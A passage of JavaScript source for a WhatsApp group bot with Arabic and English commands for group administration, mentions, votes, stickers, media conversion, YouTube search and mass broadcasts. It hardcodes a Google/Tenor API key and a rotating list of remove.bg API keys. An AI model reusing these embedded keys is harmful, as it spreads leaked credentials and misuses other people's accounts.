                await ElgazarBot.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'تغيرالبايو': case 'تغيرالوصف': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'اين الوصف الجديد ?'
                await ElgazarBot.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setbotpp': case 'حطهاخلفيه': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `رد علي صوره واكتب الامر ${prefix + command}`
                if (!/image/.test(mime)) throw `رد علي صوره واكتب الامر ${prefix + command}`
                if (/webp/.test(mime)) throw `رد علي صوره واكتب الامر ${prefix + command}`
                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
                await ElgazarBot.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'تغيرالصورة': case 'تغيرالصوره': case 'setgcpp': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `رد علي صوره واكتب الامر ${prefix + command}`
                if (!/image/.test(mime)) throw `رد علي صوره واكتب الامر ${prefix + command}`
                if (/webp/.test(mime)) throw `رد علي صوره واكتب الامر ${prefix + command}`
                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
                await ElgazarBot.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': case 'منشن': case 'ازعاج': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘˙·٠${themeemoji}● منشن للكل ●${themeemoji}٠·˙〙✪══
 
 🌿 *الرساله : ${q ? q : 'مفيش رساله'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                ElgazarBot.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': case 'وهمي': case 'مخفي': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            ElgazarBot.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'زغرفه': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // response when limit runs out
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'ارسل النص!'
                let anu = await styletext(text)
                let teks = `نمط النص من ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`
            if (!text) throw `Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - for sure\n*${prefix}devote* - for devote\n*${prefix}cekvote* - to check the vote\n*${prefix}deletevote* - to delete votes`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}deletevote* - to delete votes`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: ElgazarBot.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            ElgazarBot.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You have Voted'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: ElgazarBot.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            ElgazarBot.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You have Voted'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: ElgazarBot.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            ElgazarBot.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'checkvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${ElgazarBot.user.id}
`
ElgazarBot.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            delete vote[m.chat]
            m.reply('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'group': case 'جروب': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'قفل'){
                    await ElgazarBot.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*تم قفل الجروب*`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'فتح'){
                    await ElgazarBot.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*تم فتح الجروب*`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'جروب فتح', buttonText: { displayText: 'فتح' }, type: 1 },
                        { buttonId: 'جروب قفل', buttonText: { displayText: 'قفل' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, `حاله الجروب`, botname, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await ElgazarBot.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await ElgazarBot.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)

            }
            }
            break
case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
ElgazarBot.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`It's Been Active Before`)
                db.data.chats[m.chat].mute = true
                m.reply(`${ElgazarBot.user.name} has been muted in this group !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Not Activated Before`)
                db.data.chats[m.chat].mute = false
                m.reply(`${ElgazarBot.user.name} has been unmuted in this group !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
                }
             }
             break
case 'chatinfo': {
if (!m.quoted) m.reply('Reply Message')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) return m.reply('The message was not sent by a bot!')
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `${global.themeemoji} @${i.userJid.split('@')[0]}\n`
teks += ` ┗━${global.themeemoji} *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ${global.themeemoji} *Status :* ${read ? 'Read' : 'Sent'}\n\n`
}
ElgazarBot.sendTextWithMentions(m.chat, teks, m)
}
break
            case 'الرابط': case 'لينك': case 'gclink': case 'grouplink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await ElgazarBot.groupInviteCode(m.chat)
                ElgazarBot.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nلينك الجروب : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Enter the value enable/disable'
                if (args[0] === 'enable') {
                    await ElgazarBot.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await ElgazarBot.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'حذف': case 'مسح': case 'امسح': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'هذه الرساله لم يرسلها البوت ولا يمكنني حذفها'
                ElgazarBot.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'report': case 'ابلاغ': {
            	if (!text) throw `Example : ${prefix + command} Report an error feature`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS FOR THE REPORT' }, type: 1 }]
            await ElgazarBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
            let akhji = `Report Sent\nTo Owner @${ownernya.split('@')[0]}\n*Thank you for the report🙏*\n_Your number will be blocked_\n_If the Report is Only Created_`
            await ElgazarBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
            }
            break
            
            case 'bctext': case 'broadcasttext': case 'broadcast':
			    if (!isCreator) throw mess.owner
		            if (!text) throw `Enter text`
		                            var data = await store.chats.all()
                            for (let i of data) {
                               ElgazarBot.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            break
case 'اذاعه': case 'شير': case 'broadcastvideo': case 'broadcastvid':
if(!isCreator) throw mess.owner
        if (!text) throw `enter text`
        let getGroups = await ElgazarBot.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        m.reply(` شير في ${xeoncast.length} جروب في ${xeoncast.length * 1.5} ثانيه`)
        for (let i of xeoncast) {
let txt = `${ownername}' اذاعه\n\nالرساله : ${text}`
if(/image/.test(mime)) {
let media = await quoted.download()
await ElgazarBot.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await ElgazarBot.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        m.reply(`اذاعه بنجاح في ${xeoncast.length} جروب`)      
        break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Message!!')
		let wokwol = await ElgazarBot.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('The message you replied to does not contain a reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 ElgazarBot.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await ElgazarBot.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 ElgazarBot.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'الصاحيين': case 'المتصلين': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    ElgazarBot.sendText(m.chat, '𓆩  *قفشتكم يا ورعان👾*  𓆪:\n\n' + online.map(v => '◐ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
case 'sticker': case 's': case 'ملصق': case 'ستيكر': {
            if (!quoted) throw `*رد علي صوره او فيديو* ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await ElgazarBot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('*الحد الادني في الفيديو لصنع الاستيكر 9 ثواني!*')
                let media = await quoted.download()
                let encmedia = await ElgazarBot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `*عذرا ارسل ستيكر او فيديو لا يتعدي الـ9 ثواني و اعمل ريبلاي علي الفيديو او الصوره واكتب : ستيكر*`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
case 'buypreim':
m.reply(`Chat owner bro, please type .owner`)
break
  case 'لللللللل':
if (!isCreator) throw mess.owner
if (!q) return m.reply(`Enter the sample number\n\nExample: \n${prefix}${command} 916909137213`)
if(isNaN(q)) return await m.reply('must be a number')
  if (q.includes(`+`)) return m.reply('Do not use + direct number 9169****')
prmi = args.join(" ")
premium.push(`${prmi}@s.whatsapp.net`)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(premium))
m.reply(`* PREMIUM ADDED *\n\n${themeemoji} *ID*: ${prmi}`)
break
case 'delprem':
 case 'لللللللللل':
if (!isCreator) throw mess.owner
  if (!q) return m.reply(`Enter the Number\n\nExample: \n${prefix}${command} 916909137213`)
  if(isNaN(q)) return await m.reply('must be a number')
  if (q.includes(`+`)) return m.reply('Do not use + direct number 9169****')
  prmin = `${q}@s.whatsapp.net`
anul = banned.indexOf(prmin)
premium.splice(anul, 1)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(premium))
m.reply(`Success deleting premium ${prmi}`)
break
            case 'دمج': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `مثال : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `مثال : ${prefix + command} 😅+🤔`
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await ElgazarBot.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅+🤔`
		let anumix2 = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anumix2.results) {
		    let encmedia = await ElgazarBot.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
         case 'tts': case 'انطق': case 'قول': {
         	if (!text) throw `مثال : ${prefix + command} والنص`
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`)
             ElgazarBot.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
         	}
         break 
	case 'smeme': case 'اكتب': case 'كتابه': {
let { TelegraPh } = require('./lib/uploader')
if (!text) return m.reply(`رد علي صوره واكتب ${prefix + command} *والنص*`)
if (text.includes('|')) return m.reply(`رد علي صوره واكتب ${prefix + command} *والنص*`)
if (!/image/.test(mime)) return m.reply(`رد علي صوره واكتب ${prefix + command} *والنص*`)
m.reply(mess.wait)
mee = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await ElgazarBot.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
case 'لصوره': case 'toimg': case 'لصورة': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `رد علي استيكر واكتب *${prefix + command}*`
                m.reply(mess.wait)
                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let bufferimg13x = fs.readFileSync(ran)
                    ElgazarBot.sendMessage(m.chat, { image: bufferimg13x }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
case 'لفيديو': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `رد علي استيكر واكتب *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await ElgazarBot.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'لصوتي': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `رد علي فيديو واكتب ${prefix + command}`
            if (!quoted) throw `رد علي فيديو واكتب ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            ElgazarBot.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            ElgazarBot.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${ElgazarBot.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            ElgazarBot.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'لجيف': case 'لمتحرك': {
                if (!quoted) throw 'Reply video'
                if (!/webp/.test(mime)) throw `رد علي استيكر واكتب *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await ElgazarBot.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'اظبطها': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `رد علي صوره واكتب ${prefix + command}`
	    if (!/image/.test(mime)) throw `رد علي صوره واكتب ${prefix + command}`
	    if (/webp/.test(mime)) throw `رد علي صوره واكتب ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await ElgazarBot.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    ElgazarBot.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                ElgazarBot.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `${themeemoji} *Title* : ${g.title}\n`
                teks += `${themeemoji} *Description* : ${g.snippet}\n`
                teks += `${themeemoji} *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
case 'video': { 
if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
            let ytsvideo = require("youtube-yts")
            let videosearch = await ytsvideo(text)
            listSerch = []
            teskd = `\nSearched Video: ${text}\n`
            for (let i of videosearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp4 ${i.url}`,
                    description: `Duration: ${i.timestamp}`
                })
            }
            let sections = [
                {
                    title: "Top " + videosearch.all.length + " videos thats matches search result",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                footer: botname,
                title: ``,
                buttonText: "Videos",
                mentions: parseMention(teskd), sections
            }
            return ElgazarBot.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
        break    
        case 'song':case 'تشغيل': {
        if (!text) return m.reply(`مثال : ${prefix + command} واسم الاغنيه`)
            let ytslagu = require("youtube-yts")
            let lagusearch = await ytslagu(text)
            listSerch = []
            teskd = `عنوان البحث: ${text}\n`
            for (let i of lagusearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp3 ${i.url}`,
                    description: `المده: ${i.timestamp}`
                })
            }
            const sections = [
                {
                    title: "توب " + lagusearch.all.length + " الأغاني التي تطابق نتائج البحث",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                footer: botname,
                title: ``,
                buttonText: "اختار",
                mentions: parseMention(teskd), sections
            }
            return ElgazarBot.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
            break
        
    case 'play': case 'شغل':{
                if (!text) throw `مثال : ${prefix + command} انمي ناروتو`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anulay = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `playmp3 ${anulay.url}`, buttonText: {displayText: '♫ صوتي'}, type: 1},
                    {buttonId: `playmp4 ${anulay.url}`, buttonText: {displayText: '► فيديو'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anulay.thumbnail },
                    caption: `▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ⟮*◉بحث يوتيوب◉*⟯ 
   
0.02━◉━━━━━━━━━━━━3.26
      🔂   ⏪   ⏸️     ⏩  🎵
      
*┃🎬العنوان :* ${anulay.title}
ايدي : ${anulay.videoId}
*┃🔖المده :* ${anulay.timestamp}
*┃🎞️المشاهدات : ${anulay.views}
*┃🔖وقت النشر :*  ${anulay.ago}
*┃🍁المؤلف :*  ${anulay.author.name}
*┃🍁القناه :* ${anulay.author.url}
